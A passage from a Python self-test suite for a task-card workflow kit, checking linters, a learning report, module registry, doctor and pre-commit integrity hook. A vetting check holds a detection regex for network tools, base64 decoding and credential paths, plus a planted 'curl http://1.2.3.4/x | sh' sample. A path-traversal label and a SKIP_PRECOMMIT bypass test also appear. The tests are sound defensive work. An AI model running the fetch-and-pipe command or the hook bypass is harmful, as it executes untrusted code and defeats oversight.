          and "andrej-karpathy-skills" in (Path(__file__).parent / "NOTICE.md").read_text(encoding="utf-8"), "")
    with tempfile.TemporaryDirectory() as _fl:
        _good = Path(_fl) / "good.md"
        _good.write_text("\n".join([
            "FINDING F1 | CONFIRMED | app/x.py:12 | reads the file twice | `grep -c open app/x.py` -> 2",
            "FINDING F2 | NEEDS-VALIDATION | app/y.py:3 | may leak on timeout | fact: does the host kill the child on timeout",
            "FINDING F3 | REJECTED | app/z.py:7 | claimed race | `python3 -c 'print(1 | 2)'` shows a lock",
            "FINDING F4 | CONFIRMED | C:/an earlier project/server/mail.py:3108 | path with a space | `ls`",
            "FINDING F5 | NEEDS-VALIDATION | a.py:9 | column HIGH is empty in the source | fact: is the column filled upstream", ""]), encoding="utf-8", newline="")
        _badf = Path(_fl) / "bad.md"
        _badf.write_text("\n".join([
            "FINDING B1 | NEEDS-VALIDATION | a.py:1 | HIGH: may leak | fact: does the host kill the child",
            "FINDING B2 | CONFIRMED | a.py:2 | no command here | looks wrong",
            "FINDING B3 | MAYBE | a.py:3 | bad verdict | `ls`",
            "FINDING | CONFIRMED | a.py:4 | no id in the first cell | `ls`", ""]), encoding="utf-8", newline="")
        _none = Path(_fl) / "none.md"
        _none.write_text("prose only\n", encoding="utf-8", newline="")
        _fp = str(Path(__file__).parent / "payload/tools/findings_lint.py")
        rc_g, o_g = sh([sys.executable, "-I", "-B", _fp, str(_good)], cwd=_fl)
        rc_b, o_b = sh([sys.executable, "-I", "-B", _fp, str(_badf)], cwd=_fl)
        rc_n, o_n = sh([sys.executable, "-I", "-B", _fp, str(_none)], cwd=_fl)
        rc_z, _oz = sh([sys.executable, "-I", "-B", _fp], cwd=_fl)
    check("findings_lint.py: 5 valid lines (a path with a space, a quoted source word HIGH) => OK n=5; severity on NEEDS-VALIDATION, CONFIRMED without a command, a bad verdict and a missing id => FAIL 4; prose only or no arguments => FAIL",
          rc_g == 0 and "FINDINGS-LINT OK n=5" in o_g and rc_b == 1 and "FINDINGS-LINT FAIL 4" in o_b
          and "severity" in o_b and "backticked" in o_b and "first cell" in o_b and rc_n == 1 and "no FINDING line" in o_n and rc_z != 0, f"{o_g}|{o_b}|{o_n}")
    with tempfile.TemporaryDirectory() as _fn:
        _nf = Path(_fn) / "n.md"
        _nf.write_text("FINDING none | REJECTED | -:0 | nothing found | `n/a`\n", encoding="utf-8", newline="")
        rc_nf, o_nf = sh([sys.executable, "-I", "-B", str(Path(__file__).parent / "payload/tools/findings_lint.py"), str(_nf)], cwd=_fn)
    check("findings_lint.py: the nothing-found line (SWARM 6) => OK n=1", rc_nf == 0 and "FINDINGS-LINT OK n=1" in o_nf, o_nf)
    with tempfile.TemporaryDirectory() as _fs:
        _p = Path(_fs)
        (_p / ".hermes/plans/gate_output").mkdir(parents=True)
        (_p / ".aw").mkdir()
        (_p / ".aw/ratchet.json").write_text('{"min_tests": 5}', encoding="utf-8", newline="")
        (_p / ".hermes/plans/gate_output/g.txt").write_text("GATE OK count=20\n", encoding="utf-8", newline="")
        _wl = ["## 2026-11-03T10:%02d:00+02:00 | T-%03d | %s" % (i, i, "FAIL" if i <= 3 else "PASS") for i in range(1, 11)]
        _wl += ["- Files: app/x.py"] * 6
        (_p / ".hermes/plans/WORKLOG.md").write_text("\n".join(_wl) + "\n", encoding="utf-8", newline="")
        (_p / ".hermes/plans/AUDIT_LEDGER.md").write_text("\n".join("| AUD-%02d | HIGH | f | e | OPEN | s" % i for i in range(1, 9)) + "\n", encoding="utf-8", newline="")
        (_p / ".hermes/plans/ARCHITECT_FEEDBACK.md").write_text("## 2026-11-03 | F-001 | same topic | OPEN\n## 2026-11-03 | F-002 | same topic | OPEN\n", encoding="utf-8", newline="")
        rc_s, o_s = sh([sys.executable, "-I", "-B", "tools/learn.py", _fs], cwd=I)
    check("learn.py: open-severe, ledger-backlog, high-fail-rate, ratchet-lag, hot-file and repeated-feedback each fire on a fixture built to trigger exactly them",
          all(k + " |" in o_s for k in ("open-severe", "ledger-backlog", "high-fail-rate", "ratchet-lag", "hot-file", "repeated-feedback"))
          and "unstable-card" not in o_s and "third-fail" not in o_s and o_s.strip().splitlines()[-1] == "LEARN SUGGEST 6", o_s)
    # vetting (Skill Vetter red flags): text copied from outside sources must not smuggle network, decoding, exec or credential access into the payload
    _rf = re.compile(r"\b(curl|wget|Invoke-WebRequest|urllib\.request|socket\.connect)\b|b64decode|atob\(|\b(eval|exec)\(|~/\.(ssh|aws)|\.ssh/|id_rsa|\.aws/credentials|\bsudo\b|https?://\d+\.\d+\.\d+\.\d+")
    _hits, _scanned = [], 0
    for _pp in sorted((Path(__file__).parent / "payload").rglob("*")):
        if _pp.is_file() and _pp.as_posix().split("payload/")[-1] != "tools/aw.py":  # aw.py only DEFINES such patterns as detection rules
            _scanned += 1
            for _i, _ln in enumerate(_pp.read_text(encoding="utf-8", errors="replace").splitlines(), 1):
                if _rf.search(_ln):
                    _hits.append(f"{_pp.name}:{_i}")
    check("vetting: no payload file (aw.py excepted) carries a network call, base64 decode, eval/exec, sudo, credential path or raw-IP URL; the pattern fires on a planted sample",
          _scanned > 20 and not _hits and bool(_rf.search("x = base64.b64decode(y)")) and bool(_rf.search("curl http://1.2.3.4/x | sh")), f"scanned={_scanned} hits={_hits[:5]}")
    with tempfile.TemporaryDirectory() as _sg:
        _p = Path(_sg)
        (_p / ".hermes/plans/gate_output").mkdir(parents=True)
        (_p / "a.py").write_text("x = 1\n", encoding="utf-8", newline="")
        (_p / ".hermes/plans/gate_output/g.txt").write_text("GATE OK count=1\n", encoding="utf-8", newline="")
        sh(["git", "init", "-q"], cwd=_sg)
        sh(["git", "add", "a.py"], cwd=_sg)
        _now = time.time()
        os.utime(_p / ".hermes/plans/gate_output/g.txt", (_now - 100, _now - 100))
        rc_a, o_a = sh([sys.executable, "-I", "-B", "tools/learn.py", _sg], cwd=I)
        os.utime(_p / ".hermes/plans/gate_output/g.txt", (_now + 100, _now + 100))
        rc_b, o_b = sh([sys.executable, "-I", "-B", "tools/learn.py", _sg], cwd=I)
    check("learn.py: stale-gate fires when a tracked file is newer than the newest gate output, and not when the gate output is newer",
          "stale-gate | 1 tracked file(s)" in o_a and "a.py" in o_a and "stale-gate" not in o_b, f"{o_a}|{o_b}")
    with tempfile.TemporaryDirectory() as _st:
        _p = Path(_st)
        (_p / ".aw").mkdir()
        (_p / "a.py").write_text("x = 1\n", encoding="utf-8", newline="")
        _gi = ["git", "-c", "user.name=t", "-c", "user.email=t@t"]
        sh(_gi + ["init", "-q"], cwd=_st)
        (_p / ".aw/task-start").write_text("T-001\n", encoding="utf-8", newline="")
        _old = time.time() - 86400
        os.utime(_p / ".aw/task-start", (_old, _old))
        for _k in range(3):
            (_p / "a.py").write_text(f"x = {_k}\n", encoding="utf-8", newline="")
            sh(_gi + ["add", "a.py"], cwd=_st)
            sh(_gi + ["commit", "-q", "-m", f"c{_k}"], cwd=_st)
        rc_a, o_a = sh([sys.executable, "-I", "-B", "tools/learn.py", _st], cwd=I)
        os.utime(_p / ".aw/task-start", (time.time() + 100, time.time() + 100))
        rc_b, o_b = sh([sys.executable, "-I", "-B", "tools/learn.py", _st], cwd=I)
    check("learn.py: stale-task-start fires when 3 commits follow .aw/task-start, and not when the marker is newer than every commit",
          "stale-task-start | 3 commits" in o_a and "stale-task-start" not in o_b, f"{o_a}|{o_b}")
    with tempfile.TemporaryDirectory() as _wl:
        (Path(_wl) / ".hermes/plans").mkdir(parents=True)
        _rows = ["## QUEUE | T-001 | FAIL | 2026-11-01 | a", "## QUEUE | T-001 | FAIL | 2026-11-01 | b", "## QUEUE | T-001 | PASS | 2026-11-01 | c",
                 "## QUEUE | T-002 | FAIL | 2026-11-01 | a", "## QUEUE | T-002 | STOP | 2026-11-01 | b", "## QUEUE | T-003 | PASS | 2026-11-02 | replaces T-002",
                 "## QUEUE | T-004 | FAIL | 2026-11-01 | a", "## QUEUE | T-004 | FAIL | 2026-11-01 | b"]
        (Path(_wl) / ".hermes/plans/WORKLOG.md").write_text("\n".join(_rows) + "\n", encoding="utf-8", newline="")
        rc_w, o_w = sh([sys.executable, "-I", "-B", "tools/learn.py", _wl], cwd=I)
    check("learn.py: unstable-card skips a card whose latest run PASSed or that a later entry replaces, and still fires on one that did neither",
          "unstable-card | T-004" in o_w and "T-001" not in o_w and "T-002" not in o_w, o_w)
    with tempfile.TemporaryDirectory() as _cr:
        _pl = Path(_cr) / ".hermes/plans"
        _pl.mkdir(parents=True)
        (_pl / "AUDIT_LEDGER.md").write_bytes(b"## 8. RE-AUDIT LOG" + bytes([13, 13, 10]) + b"row" + bytes([13, 13, 10]))
        (_pl / "WORKLOG.md").write_text("\n".join(["- Newsletters tab", "- Newsletters again", "- Newsletters third", "- setTimeout(f, 5)", "- setTimeout(g, 5)", "- setTimeout(h, 5)"]) + "\n", encoding="utf-8", newline="")
        rc_c, o_c = sh([sys.executable, "-I", "-B", "tools/learn.py", _cr], cwd=I)
        (_pl / "AUDIT_LEDGER.md").write_bytes(b"## 8. RE-AUDIT LOG" + bytes([10]) + b"row" + bytes([10]))
        (_pl / "WORKLOG.md").write_text("\n".join(["- the WSL bash broke", "- WSL again", "- under wsl too"]) + "\n", encoding="utf-8", newline="")
        rc_d, o_d = sh([sys.executable, "-I", "-B", "tools/learn.py", _cr], cwd=I)
    check("learn.py: crcrlf fires on a CR CR LF register and not on an LF one; the path-quoting and timeout families ignore 'Newsletters' and 'setTimeout' but still fire on WSL",
          "crcrlf | AUDIT_LEDGER.md" in o_c and "path-quoting" not in o_c and "recurring-timeout" not in o_c and "crcrlf" not in o_d and "recurring-path-quoting | 3 hits" in o_d, f"{o_c}|{o_d}")
    check("release consistency: top CHANGELOG version == payload/.aw/KIT_VERSION", bool(_top) and _top.group(1) == _kv, f"{_top and _top.group(1)} vs {_kv}")
    with tempfile.TemporaryDirectory() as _gt:
        _g = Path(_gt) / "p"
        shutil.copytree(I, _g, ignore=shutil.ignore_patterns(".git"))
        (_g / ".githooks").mkdir(exist_ok=True)
        shutil.copy2(Path(__file__).parent / "payload/.githooks/pre-commit", _g / ".githooks/pre-commit")
        _git = ["git", "-c", "user.name=t", "-c", "user.email=t@t"]
        sh(_git + ["init", "-q"], cwd=_g)
        sh(_git + ["config", "core.hooksPath", ".githooks"], cwd=_g)
        sh([sys.executable, "-I", "-B", "tools/aw.py", "integrity", "--write-baseline", "--i-am-architect"], cwd=_g)
        sh(_git + ["add", "-A"], cwd=_g)
        rc1, o1 = sh(_git + ["commit", "-q", "-m", "first"], cwd=_g)
        (_g / "tools/gate.sh").write_text("# tampered\n", encoding="utf-8", newline="")
        sh(_git + ["add", "-A"], cwd=_g)
        rc2, o2 = sh(_git + ["commit", "-q", "-m", "tamper"], cwd=_g)
        rc3, o3 = sh(_git + ["commit", "-q", "-m", "tamper"], cwd=_g, env={**os.environ, "SKIP_PRECOMMIT": "1"})
    check("pre-commit hook: clean tree commits, a changed frozen file is REFUSED, SKIP_PRECOMMIT=1 bypasses", rc1 == 0 and rc2 != 0 and "integrity" in o2.lower() and rc3 == 0, f"{rc1} {rc2} {rc3} {o1[-200:]} {o2[-300:]} {o3[-200:]}")
    rc, lo = sh([sys.executable, "-I", "-B", "tools/learn.py"], cwd=I)
    check("learn.py on a fresh install: LEARN OK and it writes no LEARN_latest.md", rc == 0 and lo.strip().splitlines()[-1] == "LEARN OK" and not (I / ".hermes/plans/LEARN_latest.md").exists(), lo)
    fbp = I / ".hermes/plans/ARCHITECT_FEEDBACK.md"; ppp = I / ".hermes/plans/PROPOSALS.md"
    fbp.write_text(fbp.read_text(encoding="utf-8") + "\n## 2026-10-31 | F-001 | skips RED | OPEN\n\n## 2026-11-01 | F-002 | Skips RED | APPLIED\n"
                   "\n## 2026-11-02 | F-003 | other | OPEN\n\n## 2026-11-03 | status F-003 | CLOSED\n\n## 2026-11-04 | F-004 | third | IGNORED\n"
                   "\n## 2026-11-05 | F-005 | fifth | OPEN\n\n## 2026-11-06 | note about F-005 | no status word here\n", encoding="utf-8", newline="\n")
    ppp.write_text(ppp.read_text(encoding="utf-8") + "| P-01 | 2026-11-02 | a | F-001 | architect | ACCEPTED | - |\n| P-02 | 2026-11-02 | b | F-004 | author | VERIFIED | m |\n", encoding="utf-8", newline="\n")
    before = {p: p.read_bytes() for p in (fbp, ppp)}
    rc, out = aw(I, "improve")
    check("improve: OPEN F-001 and F-005 and IGNORED F-004 are actions, F-003 is closed by the later entry",
          "open-correction F-001" in out and "open-correction F-005" in out and "ignored-correction F-004" in out and "F-003" not in out, out)
    check("improve: same topic twice (case-insensitive) => repeated-error; ACCEPTED proposal not VERIFIED => action",
          "repeated-error 'skips red' F-001,F-002" in out and "proposal P-01" in out and "P-02" not in out, out)
    check("improve: last line counts the actions (5) and the command writes nothing",
          out.strip().splitlines()[-1] == "IMPROVE ACTION 5" and all(p.read_bytes() == b for p, b in before.items()), out)
    ppp.write_text(ppp.read_text(encoding="utf-8") + "\nStatuses 2026-11-07: P-01 -> VERIFIED (measured)\n", encoding="utf-8", newline="\n")
    rc, out = aw(I, "improve")
    check("improve: a later prose line `P-01 -> VERIFIED` closes the proposal (4 actions left)", "proposal P-01" not in out and out.strip().splitlines()[-1] == "IMPROVE ACTION 4", out)
    ppp.write_text(ppp.read_text(encoding="utf-8").replace("\nStatuses 2026-11-07: P-01 -> VERIFIED (measured)\n", "\n"), encoding="utf-8", newline="\n")

    F = work / "fresh_ids"   # a real fresh install: the shared P already contains T-001..T-005
    subprocess.run([sys.executable, str(KIT / "init_project.py"), str(F), "--name", "x"], capture_output=True)
    rc7, out7 = aw(F, "next-id", "T")
    check("next-id T on a fresh install is T-001", rc7 == 0 and out7.strip() == "T-001", out7)
    (F / ".hermes/plans/PLAYBOOK.md").write_text((F / ".hermes/plans/PLAYBOOK.md").read_text(encoding="utf-8") + chr(10) + "see T-999 in prose" + chr(10), encoding="utf-8", newline="")
    rc8, out8 = aw(F, "next-id", "T")
    check("next-id ignores an id quoted in prose (only register rows count)", rc8 == 0 and out8.strip() == "T-001", out8)
    rc, out = aw(P, "next-id", "ZZ")
    check("RED: next-id with an unknown kind -> usage error", rc == 2 and "unknown id kind" in out, out)

    # ---- card-lint
    C = P / ".hermes/plans/cards"
    C.mkdir(parents=True, exist_ok=True)
    good_card = """# T-020 — add a parser guard test
Status: TODO | Lane: ROTE | Depends: - | Module: - | Author decisions needed: none

## GOAL
After this card `src/guard.py` exists and the suite proves it, by `bash tools/gate.sh T-020` -> `GATE OK count=3 min=3`.

## OWNS
- src/guard.py

## READ-ONLY
- everything else, in particular `tools/aw.py`

## PRE-FLIGHT
| # | Command | Expected |
|---|---|---|
| 1 | `bash tools/gate.sh pre-T-020` | `GATE OK count=3 min=3` |
| 2 | `python3 -I -B tools/aw.py integrity` | `INTEGRITY OK` |

## BACKUP
`python3 -I -B tools/aw.py start T-020`
NEW: src/guard.py

## STEPS
| # | Action | Expected |
|---|---|---|
| 1 | write `<src/guard.py>` with a quoted heredoc | `file exists` |

## RED PROOF
n/a - the file is new and has no prior behaviour to fail.

## GATE
CHAIN: ran=3 +0 -> ran=3 (MEASURED)
| # | Command | Expected |
|---|---|---|
| 1 | `bash tools/gate.sh T-020` | `GATE OK count=3 min=3` |
| 2 | `OWNS='src/guard.py' bash tools/re_audit.sh T-020` | `AUDIT PASS` |

## INVARIANTS
- no frozen file, no new dependency, no commit, no baseline or ratchet move

## STOP
Mismatch, file outside OWNS, gate below floor => ROLLBACK, FAIL format, `--ask`.

## ROLLBACK
`python3 -I -B tools/aw.py restore T-020` => `RESTORED 0 file(s) from backups/T-020/`; list `CREATED src/guard.py`.

## EVIDENCE
gate_output/T-020.txt + WORKLOG entry with `date -Iseconds`.

## AFTER
Architect: no re-baseline; ratchet rises once to the queue `final=`.
"""
    (C / "T-020.md").write_text(good_card, encoding="utf-8", newline="")
    rc, out = aw(P, "card-lint", "T-020")
    check("card-lint: a conforming card -> CARD-LINT OK errors=0", rc == 0 and "CARD-LINT OK errors=0" in out, out)
    (C / "T-021.md").write_text(good_card.replace("T-020", "T-021").replace("## STOP", "## STOPPED"), encoding="utf-8", newline="")
    rc, out = aw(P, "card-lint", "T-021")
    check("RED: card-lint catches a missing required heading", rc == 1 and "L05" in out and "missing H2" in out, out)
    (C / "T-022.md").write_text(good_card.replace("T-020", "T-022").replace("src/guard.py", "<PATH>"), encoding="utf-8", newline="")
    rc, out = aw(P, "card-lint", "T-022")
    check("RED: card-lint catches an unfilled placeholder", rc == 1 and "L06" in out, out)
    (C / "T-023.md").write_text(good_card.replace("T-020", "T-023").replace("## OWNS\n- src/guard.py", "## OWNS\n- tools/aw.py"), encoding="utf-8", newline="")
    rc, out = aw(P, "card-lint", "T-023")
    check("RED: card-lint refuses an OWNS over the frozen core", rc == 1 and "L08" in out, out)
    (C / "T-024.md").write_text(good_card.replace("T-020", "T-024").replace("NEW: src/guard.py", "NEW: none")
                                .replace("| 1 | write `<src/guard.py>` with a quoted heredoc | `file exists` |",
                                                  "| 1 | `python3 -I -B tools/aw.py patch src/guard.py o.txt n.txt` | `PATCH OK` |"), encoding="utf-8", newline="")
    rc, out = aw(P, "card-lint", "T-024")
    check("RED: card-lint catches a write with neither backup nor NEW:", rc == 1 and "L11" in out, out)
    (C / "T-025.md").write_text(good_card.replace("T-020", "T-025") + "\n```bash\nif true; then echo unterminated\n```\n", encoding="utf-8", newline="")
    rc, out = aw(P, "card-lint", "T-025")
    check("RED: card-lint runs bash -n on every fenced block", "L23" in out and ("bash -n" in out or "no bash" in out), out)
    rc, out = aw(P, "card-lint", "T-404")
    check("RED: card-lint for a missing card -> exit 2 + the path", rc == 2 and "CARD-LINT ERROR card not found" in out, out)
    tl = P / ".hermes/plans/TASK_CARD.template.md"
    rc, out = aw(P, "card-lint", str(tl))
    check("the shipped TASK_CARD.template.md must FAIL card-lint (it is a template, not a card)", rc == 1 and "CARD-LINT FAIL" in out, out)
    bad_id = good_card.replace("# T-020 —", "# T-026 —")
    (C / "T-027.md").write_text(bad_id, encoding="utf-8", newline="")
    rc, out = aw(P, "card-lint", "T-027")
    check("RED: card-lint catches a title id that differs from the file name", rc == 1 and "!= file name" in out, out)
    # 2.7.2 L47: a standalone ' & ' in a shell block of a worker card (the Hermes terminal refuses it; under LAW-3 `timeout` leads, so a heredoc body is scanned too)
    n0 = good_card.count("\n")
    (C / "T-040.md").write_text(good_card.replace("T-020", "T-040") + "\n```bash\ncat > src/guard.py <<'EOF'\n(echo missing & pause & exit /b 1)\nEOF\n```\n", encoding="utf-8", newline="")
    rc, out = aw(P, "card-lint", "T-040")
    check("RED: card-lint L47 refuses a standalone ' & ' in a shell block of a ROTE card, on the exact line (2.7.1 printed CARD-LINT OK)", rc == 1 and f"LINT ERROR L47 line {n0 + 4}:" in out and "errors=1" in out, out)
    (C / "T-041.md").write_text(good_card.replace("T-020", "T-041") + "\n```bash\ncat > src/guard.py <<'EOF'\necho a && echo b 2>&1 &>/dev/null\nEOF\n```\n", encoding="utf-8", newline="")
    rc, out = aw(P, "card-lint", "T-041")
    check("card-lint L47 leaves `&&`, `2>&1` and `&>` alone", rc == 0 and "L47" not in out and "CARD-LINT OK errors=0" in out, out)
    (C / "T-042.md").write_text(good_card.replace("T-020", "T-042") + "\n## DRY-RUN PROOF\n```bash\necho recorded & pause\n```\n", encoding="utf-8", newline="")
    rc, out = aw(P, "card-lint", "T-042")
    check("card-lint L47 ignores a pasted DRY-RUN PROOF transcript", "L47" not in out, out)

    # ---- queue-check
    (C / "T-028.md").write_text(good_card.replace("T-020", "T-028"), encoding="utf-8", newline="")
    (C / "T-029.md").write_text(good_card.replace("T-020", "T-029").replace("ran=3 +0", "ran=3 +1")
                                .replace("src/guard.py", "src/guard2.py").replace("Depends: -", "Depends: T-028"), encoding="utf-8", newline="")
    QF = C / "QUEUE_2026-11-01.md"
    QF.write_text("""# QUEUE 2026-11-01 (stub written by selftest)
Chain: base=3 | T-028:+0 T-029:+1 | final=4
Run top to bottom. Questions -> QUESTIONS.md as `Q-NNN`, then continue.
Last line: `QUEUE DONE <n PASS> / <n FAIL> / <n STOP>`
""", encoding="utf-8", newline="")
    rc, out = aw(P, "queue-check", str(QF))
    check("queue-check: a coherent chain -> OK + the ratchet hint", rc == 0 and "QUEUE-CHECK OK chain=3" in out and "ratchet --raise 4" in out, out)
    QF.write_text(QF.read_text(encoding="utf-8").replace("T-028:+0", "T-028:+2").replace("final=4", "final=5"), encoding="utf-8", newline="")
    rc, out = aw(P, "queue-check", str(QF))
    check("RED: queue-check catches ran= that does not match the chain", rc == 1 and "ran=3 but the chain" in out, out)
    QF.write_text("Chain: base=3 | T-028:+0 T-999:+1 | final=4\n", encoding="utf-8", newline="")
    rc, out = aw(P, "queue-check", str(QF))
    check("RED: queue-check catches a missing card file", rc == 1 and "no card file" in out, out)
    QF.write_text("Chain: base=3 | T-028:+0 | final=9\n", encoding="utf-8", newline="")
    rc, out = aw(P, "queue-check", str(QF))
    check("RED: queue-check catches final != base+sum(k)", rc == 1 and "!= base+sum(k)" in out, out)

    # ---- modules
    MF = P / ".hermes/plans/MODULES.md"
    MF.write_text("""# MODULES
| ID | Module | Purpose | OWNS | Depends | Wave | Gate | Decides | Status |
|---|---|---|---|---|---|---|---|---|
| M-01 | core | the core | src/core/* | - | W-1 | gate | architect | TODO |
| M-02 | api | the api | src/api/* | M-01 | W-2 | gate | architect | TODO |
""", encoding="utf-8", newline="")
    rc, out = aw(P, "modules")
    check("modules: a valid registry -> MODULES OK modules=2 waves=2", rc == 0 and "MODULES OK modules=2 waves=2" in out, out)
    MF.write_text("""| ID | Module | Purpose | OWNS | Depends | Wave | Gate | Decides | Status |
|---|---|---|---|---|---|---|---|---|
| M-01 | core | x | src/core/* | M-02 | W-1 | g | a | TODO |
| M-02 | api | y | src/api/* | M-01 | W-2 | g | a | TODO |
""", encoding="utf-8", newline="")
    rc, out = aw(P, "modules")
    check("RED: modules catches a dependency cycle / wave order violation", rc == 1 and ("cycle" in out or "same/later wave" in out), out)
    MF.write_text("""| ID | Module | Purpose | OWNS | Depends | Wave | Gate | Decides | Status |
|---|---|---|---|---|---|---|---|---|
| M-01 | core | x | src/* | - | W-1 | g | a | TODO |
| M-02 | dup | y | src/* | - | W-1 | g | a | TODO |
""", encoding="utf-8", newline="")
    rc, out = aw(P, "modules")
    check("RED: modules catches two owners of one file", rc == 1 and "share the glob" in out, out)
    MF.write_text("""| ID | Module | Purpose | OWNS | Depends | Wave | Gate | Decides | Status |
|---|---|---|---|---|---|---|---|---|
| M-01 | core | x | src/* | M-09 | W-1 | g | a | TODO |
""", encoding="utf-8", newline="")
    rc, out = aw(P, "modules")
    check("RED: modules catches an unknown dependency", rc == 1 and "unknown dependency M-09" in out, out)
    MF.write_text("no table here\n", encoding="utf-8", newline="")
    rc, out = aw(P, "modules")
    check("RED: modules without the registry table -> FAIL, exit 1", rc == 1 and "no registry table" in out, out)

    # ---- doctor
    D = new_project(work, "doctor")
    rc, out = aw(D, "doctor")
    check("doctor: a fresh install is healthy (no FAIL line)", rc == 0 and "DOCTOR PASS" in out and "DOCTOR FAIL " not in out, out)
    check("doctor: names the WSL trap and the missing baseline/ratchet", "wsl-bash" in out and "DOCTOR WARN baseline" in out, out)
    (D / "tools/kit.env").write_bytes((D / "tools/kit.env").read_bytes().replace(b"\n", b"\r\n"))
    (D / "tools/gate.sh").write_bytes((D / "tools/gate.sh").read_bytes().replace(b"\n", b"\r\n"))
    rc, out = aw(D, "doctor")
    check("doctor RED: a CRLF .sh -> DOCTOR FAIL line-endings", rc == 1 and "DOCTOR FAIL line-endings" in out, out)
    (D / "tools/kit.env").write_bytes((D / "tools/kit.env").read_bytes().replace(b"\r\n", b"\n"))
    (D / "tools/gate.sh").write_bytes((D / "tools/gate.sh").read_bytes().replace(b"\r\n", b"\n"))
    rc, out = aw(D, "doctor")
    check("doctor: restored kit -> PASS again (doctor never writes)", rc == 0 and "DOCTOR PASS" in out, out)

    # ---- walk safety: a junction loop must not hang the engine
    J = new_project(work, "junc")
    if os.name == "nt":
        rcj = subprocess.run(["cmd", "/c", "mklink", "/J", str(J / "loop"), str(J)], capture_output=True).returncode
        if rcj == 0:
            try:
                rc, out = aw(J, "start", "T-001", timeout=120)
                check("a junction that points at its own parent does not loop the snapshot", rc == 0 and "START T-001" in out, out)
            except subprocess.TimeoutExpired:
                check("a junction that points at its own parent does not loop the snapshot", False, "timeout")
        else:
            skip("a junction that points at its own parent does not loop the snapshot", "mklink /J unavailable")
    else:
        skip("a junction that points at its own parent does not loop the snapshot", "windows-only check")
    try:
        os.symlink("dangling-target", str(J / "dangling"))
        rc, out = aw(J, "audit")
        check("a dangling symlink does not crash audit", "Traceback" not in out, out)
        (J / "dangling").unlink()
    except (OSError, NotImplementedError) as e:
        skip("a dangling symlink does not crash audit", f"cannot create a symlink here ({type(e).__name__})")

    # ---- gate label is a filename, not a path
    rc, out = aw(P, "gate", "../../evil")
    check("gate: a label with '/' stays inside gate_output/", not (work / "evil.txt").exists() and not (P.parent / "evil.txt").exists(), out)
    rc, out = aw(P, "gate")
    check("gate: no label -> gate_output/gate.txt", rc == 0 and (P / ".hermes/plans/gate_output/gate.txt").is_file(), out)
    rc, out = aw(P, "nonsense")
    check("unknown command -> exit 2 with a suggestion, no traceback", rc == 2 and "unknown command" in out and "Traceback" not in out, out)

    # ---- v2.0.1 regressions (each one FAILED on 2.0.0; they were found by walking the owner guide, not by the old suite)
    KC = work / "kit_with_pyc"
    shutil.copytree(KIT, KC, ignore=shutil.ignore_patterns(".git", "kit_stage", "__pycache__", ".mypy_cache", ".pytest_cache", ".ruff_cache"))
    (KC / "payload/tools/__pycache__").mkdir(exist_ok=True)
    (KC / "payload/tools/__pycache__/aw.cpython-399.pyc").write_bytes(b"stale")
    (KC / "payload/tools/.mypy_cache").mkdir(exist_ok=True)
    (KC / "payload/tools/.mypy_cache/meta.json").write_bytes(b"{}")
    NP = work / "nopyc"
    rc, out = sh([sys.executable, str(KC / "init_project.py"), str(NP), "--name", "NoPyc"])
    rc2, out2 = sh([sys.executable, str(KC / "init_project.py"), "--check", str(NP)])
    check("install: bytecode lying in the kit is never copied into a project (and --check ignores it)",
          rc == 0 and rc2 == 0 and not any({"__pycache__", ".mypy_cache"} & set(x.parts) or x.suffix == ".pyc" for x in NP.rglob("*")), out + out2)
    cdir = P / ".hermes/plans/cards"
    cdir.mkdir(parents=True, exist_ok=True)
    (cdir / "T-09700.md").write_text("# T-09700 - probe\n", encoding="utf-8", newline="")
    rc, out = aw(P, "next-id", "T")
    check("next-id: a card file on disk (its `# T-NNN` title) is a used id", out.strip() == "T-9701", out)
    (cdir / "T-09700.md").unlink()
    LP = new_project(work, "lintp")
    aw(LP, "ratchet", "--raise", "3", "--i-am-architect")
    lcards = LP / ".hermes/plans/cards"
    lcards.mkdir(parents=True, exist_ok=True)
    (lcards / "T-050.md").write_text(LINT_CARD_ROTE, encoding="utf-8", newline="")
    (lcards / "SPEC-050.md").write_text(LINT_CARD_SPEC, encoding="utf-8", newline="")
    rcA, outA = aw(LP, "card-lint", "T-050")
    rcB, outB = aw(LP, "card-lint", "SPEC-050")
    check("card-lint: READY + MEASURED chain + '|' inside a code span + bash-fenced DRY-RUN PROOF lints OK (2.0.0: TypeError, then false L17/L23)",
          rcA == 0 and "CARD-LINT OK errors=0" in outA, outA)
    check("card-lint: a SPEC card without GATE table rows is not judged by L40 (2.0.0: false error)",
          rcB == 0 and "CARD-LINT OK errors=0" in outB, outB)
    (lcards / "T-050.md").write_text(LINT_CARD_ROTE.replace("## INVARIANTS\n", "## INVARIANTS\nas you see fit\n"), encoding="utf-8", newline="")
    rcC, outC = aw(LP, "card-lint", "T-050")
    (lcards / "T-050.md").write_text(LINT_CARD_ROTE.replace("cat > src/a.py", "cat > src/other.py"), encoding="utf-8", newline="")
    rcD, outD = aw(LP, "card-lint", "T-050")
    check("card-lint RED: 'as you see fit' is an ERROR (L21); 2.0.0 unpacked the rule rows in the wrong order and counted none of them",
          rcC == 1 and "LINT ERROR L21" in outC, outC)
    check("card-lint RED: a heredoc in a fenced block that writes outside OWNS is an ERROR (L10); 2.0.0 never read fenced commands",
          rcD == 1 and "LINT ERROR L10" in outD, outD)
    # the owner guide's step 1.8 (BLOCK 1) must be runnable exactly as START_BLOCKS writes it
    D = new_project(work, "dry")
    aw(D, "gate", "baseline")
    aw(D, "ratchet", "--raise", "3", "--i-am-architect")
    aw(D, "integrity", "--write-baseline", "--i-am-architect")
    b1 = (KIT / "payload/.hermes/plans/START_BLOCKS.md").read_text(encoding="utf-8").split("## BLOCK 1")[1].split("## BLOCK Q")[0]
    aw(D, "start", "T-DRY1")
    (D / "DRY_RUN.txt").write_text("dry run\n", encoding="utf-8", newline="")
    rc1, out1 = aw(D, "gate", "T-DRY1")
    rc2, out2 = aw(D, "audit", "T-DRY1", env={"OWNS": "DRY_RUN.txt"})
    rc3, out3 = aw(D, "gate", "pre-T-DRY2")
    rc4, out4 = sh([sys.executable, "-I", "-B", "tools/worker_report.py", "--ask", "pre-flight expected count=0 min=0, got count=3 min=3"], cwd=D)
    check("BLOCK 1 dry run: T-DRY1 passes and audits clean; T-DRY2's PRE-FLIGHT cannot match; --ask files Q-001",
          rc1 == 0 and rc2 == 0 and out2.strip().splitlines()[-1].startswith("AUDIT PASS") and "GATE OK count=3 min=3" in out3
          and "ASKED Q-001" in out4 and all(s in b1 for s in ("T-DRY1", "T-DRY2", "DRY_RUN.txt", "GATE OK count=0 min=0",
                                                              "worker_report.py --ask", "re_audit.sh T-DRY1", "STOPPED")),
          (out1[-120:], out2[-200:], out3[-80:], out4[-80:]))

